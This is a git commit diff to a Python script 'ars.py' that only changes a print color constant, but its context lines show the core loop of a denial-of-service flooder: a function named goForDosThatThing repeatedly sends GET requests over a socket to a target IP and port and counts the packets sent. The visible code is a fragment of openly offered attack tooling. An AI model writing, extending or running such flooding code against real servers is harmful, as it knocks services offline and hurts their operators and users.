ec505b0aa4dec4702d93fb7cea49931ca099b47e
Kun-fy <kosakatakun@gmail.com>
2026-02-10 01:58:18 +0700

    Update ars.py

--- ars.py
+++ ars.py
@@ -60,7 +60,7 @@ def goForDosThatThing():
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                         time.sleep(1) 
-                        print(Colors.BOLD + Colors.BLUE + "Sent packet" + Colors.WHITE + str(Count.packetCounter))
+                        print(Colors.BOLD + Colors.OKBLUE + "Sent packet" + Colors.WHITE + str(Count.packetCounter))
                         Count.packetCounter = Count.packetCounter + 1
                         print(Colors.BOLD + Colors.BOLD + "successful:> " + Colors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "")
                     except socket.error:
